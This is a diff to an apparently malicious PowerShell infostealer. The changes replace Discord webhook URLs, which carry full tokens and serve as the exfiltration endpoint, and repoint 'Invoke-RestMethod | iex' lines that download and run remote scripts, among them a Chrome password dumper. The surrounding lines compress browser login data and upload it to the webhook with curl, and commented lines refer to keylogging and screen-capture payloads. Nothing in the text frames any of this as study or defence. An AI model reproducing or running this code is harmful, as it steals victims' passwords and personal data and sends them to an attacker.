@@ -14,7 +14,7 @@ else{
 }
 
 sleep 1
-$hookurl = "https://discordapp.com/api/webhooks/1326939740376666173/ObqWii2cZjelYgJsDNrGSka_Af717jbcjE1NOPcrEHjwE1jTJlJIyVH4XjRpWFyQ99ye"
+$hookurl = "https://discordapp.com/api/webhooks/1326958104461574195/XWeyHvUfeAM4m9aAuTJeYSO_sxBa5u2_XlRhb9F_bHgwJrR78ZiFYB_Ufmx35jC3o2Ns"
 # shortened URL Detection
 if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}
 
@@ -23,7 +23,7 @@ Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Bo
 
 Add-Type -AssemblyName System.Windows.Forms
 # dump pass chrome
-Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/Chrome80Dp.ps1 | iex
+Invoke-RestMethod https://raw.githubusercontent.com/bindas88/sni/main/Chrome80Dp.ps1 | iex
 # WMI Classes
 $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
 $userInfo = Get-WmiObject -Class Win32_UserAccount
@@ -340,9 +340,9 @@ if (test-path "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data") {
 compress-archive -path "$outpath" -destinationpath "$outpath.zip" -force
 curl.exe -k -X POST -F 'payload_json={\"username\": \"BinBot\", \"content\": \"\", \"avatar_url\": \"https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif\"}' -F "file=@$env:temp\B1555.005.zip" $hookurl
 # Grab pass browserpassview
-# Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/WbGrab.ps1 | iex
+# Invoke-RestMethod https://raw.githubusercontent.com/bindas88/sni/main/WbGrab.ps1 | iex
 # keylogchrome
-# Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/main.ps1 | iex
+# Invoke-RestMethod https://raw.githubusercontent.com/bindas88/sni/main/main.ps1 | iex
 # Invoke-RestMethod https://raw.githubusercontent.com/bindas88/rem/main/Screen-Party.ps1 | iex
 # Invoke-RestMethod https://raw.githubusercontent.com/Nitro4542/getjumpscared/main/scripts/downloader.ps1 | iex
 Sleep 10
